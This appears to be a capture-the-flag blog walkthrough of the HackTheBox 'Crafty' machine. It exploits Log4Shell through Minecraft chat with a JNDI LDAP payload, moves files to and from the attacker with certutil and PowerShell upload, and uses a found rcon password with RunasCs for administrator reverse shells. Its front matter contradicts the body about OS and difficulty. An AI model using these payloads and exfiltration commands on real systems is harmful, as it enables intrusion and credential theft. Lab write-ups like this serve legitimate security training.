---
title: "CTF: crafty (HTB, Linux, Insane)"
excerpt: "A detailed walkthrough of \"crafty\" machine on HackTheBox."
tagline: "Breach insecure cloud storage!"
header:
  teaser: /docs/assets/images/teasers/ctf/crafty.png
  og_image: /docs/assets/images/teasers/ctf/crafty.png
  overlay_image: /docs/assets/images/teasers/ctf/crafty2.png
author_profile: false
share: false
tags:
  - HackTheBox
  - Windows
  - Difficulty-Easy
  - Log4Shell
categories:
  - CTF
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

## Description

This is a detailed walkthrough of "Crafty" machine on HackTheBox that is based on Windows operating system and categorized as "Easy" by difficulty. Never in my entire existence had I thought I would fall so low that I'd touch Minecraft in any shape or form, however, the day has come... "Enjoy" a takeover of a Minecraft server that is vulnerable to the infamous **Log4Shell** (CVE-2021-44228)! It should be noted that at the moment of writing, the machine has not been implemented in a quality manner, and even if you follow all the instructions step by step, you may still experience connectivty issues and exploits not functioning properly (it's recommended to spare yourself from pain and simply reset the machine). However, through rigorous testing, yours truly described the smoothest exploitation scenario.

## Reconnaissance

Run **nmap** to scan all ports:

```bash
nmap -p- <IP>
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/nmapscan.png" alt="">
  <figcaption>Ports 80 HTTP and 25565 Minecraft are open.</figcaption>
</figure>

As soon as Minecraft appeared in the scan results, Log4Shell came across my mind due to a video watched on YouTube a while ago, Minecraft servers being vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). It was possible to inject **JNDI** queries right into the game chat and the server would execute them, provided that it utilized **Log4j** versions 1.7 to 1.18.

Navigating to the website would feature the following page:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/craftypage.png" alt="">
  <figcaption>Donate your lunch money!</figcaption>
</figure>

The website hosted on Windows IIS cannot be exploited in any way, so the Challenger has to focus on **port 25565** where Minecraft is running. The home page also mentions the server's subdomain, **play.crafty.htb**.

## Weaponization

It is required to install the following tools to establish foothold:

* Download the following [Log4j PoC](https://github.com/kozmer/log4j-shell-poc/tree/main?tab=readme-ov-file) by Kozmer from GitHub.

* The exploit requires **jdk-8u20** and checks if its present in the directory. Downloading the exact version from Oracle website prompts for account creation. I was able to find a slightly different jdk version - [jdk-8u202](https://mirrors.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz) that works with the exploit. Once downloaded and extracted in the same directory as the POC script, rename the jdk directory to **jdk1.8.0_20** in order to bypass the script check.

* Download [PyCraft](https://github.com/ammaraskar/pyCraft): a CLI Minecraft client that allows to connect to the server and send messages to the game chat (best alternative to avoid the disgrace of install an actual Minecraft client on your computer).

Once the above steps have been completed, modify the code of **poc.py** file in the *log4j-shell-poc* directory to execute **"cmd.exe"** (since the server is hosted on Windows) in the payload:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/pocpy.png" alt="">
  <figcaption></figcaption>
</figure

## Exploitation / Foothold

Run Kozmer's PoC:

```bash
python3 poc.py --userip YOUR_IP --webport YOUR_HTTP_PORT --lport YOUR_NETCAT_PORT
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/kozmerpocrun.png" alt="">
  <figcaption></figcaption>
</figure>

The exploit will open a HTTP server on the specified port where it will host a malicious payload referring to Netcat listener. Also it opens an LDAP server with the instructions that would redirect the server to the Attacker's HTTP server. In the output, the tool specifies a JNDI payload that will need to be injected in the game chat.

Run Netcat:

```bash
nc -lnvp <PORT>
```

Connect to the server with PyCraft:
```bash
python start.py -o -u $USER -s play.crafty.htb:25565
# Once the chat opens, inject the JDNI payload provided by the exploit:
${jndi:ldap://<YOUR IP>:1389/a}
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/pycraft.png" alt="">
  <figcaption></figcaption>
</figure>

### User flag

The Challenger should receive a reverse shell on the Netcat listener. Claim the user flag:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/user.png" alt="">
  <figcaption></figcaption>
</figure>

## Privilege escalation

Navigate to *C:\\User\\svc_minecraft\\server\\plugins*. There's a **playercounter-1.0-SNAPSHOT.jar** file in there:

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/plugins.png" alt="">
  <figcaption></figcaption>
</figure>

Now it's necessary to transfer the file to the Attacker's machine to extract its contents. Upload it to your HTTP server (other file transfer methods were not working properly on this machine at the moment of writing) with Powershell. You can use [SimpleHTTPServerWithUpload](https://github.com/Tallguy297/SimpleHTTPServerWithUpload) Python tool.

```python
python3 SimpleHTTPServerWithUpload.py <PORT>
```
Then on the Target machine:
```powershell
powershell
(New-Object System.Net.WebClient).UploadFile('http://<IP>:<PORT>/', 'playercounter-1.0-SNAPSHOT.jar')
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/jarupload.png" alt="">
  <figcaption></figcaption>
</figure>

The file should be uploaded in the directory with HTTP server tool.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/jardownload.png" alt="">
  <figcaption></figcaption>
</figure>

Let's view the contents of the file with **jd-gui**. Install it on your machine with *sudo apt-get jd-gui*. In the source code of **Playercounter.class** we see a command for **rcon** (Remote Console for the Minecraft server) that contains a <ins>password</ins> string.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/rconpass.png" alt="">
  <figcaption></figcaption>
</figure>

It's time to use the discovered passsword. For this purpose, we will utilize [RunasCs](https://github.com/antonioCoco/RunasCs) - a utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.

Download the tool. Start a HTTP server and transfer the tool to the Target machine:

```powershell
# Attacker:
python3 -m http.server <PORT>
# Target:
certutil.exe -urlcache -split -f "http://<IP>:<PORT>/runascs.exe" runascs.exe
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/rundadownload.png" alt="">
  <figcaption>Example of successfull download.</figcaption>
</figure>

Start a Netcat listner on the Attacker machine. Back on the Target machine, run **runascs.exe** with the following parameters:

```powershell
.\runascs.exe administrator <PASSWORD> cmd.exe -r <IP>:<PORT>
```

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/runascscmd.png" alt="">
  <figcaption></figcaption>
</figure>

This will send a reverse shell as **administator** user to the Attacker. Claim the root flag in the  C:\\Users\\Administrator\\Desktop folder.

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/docs/assets/images/post_images/crafty/root.png" alt="">
  <figcaption>Solved, now delete Minecraft from your computer!</figcaption>
</figure>


**Thank you for your attention and happy hacking!**
{: .notice--primary}
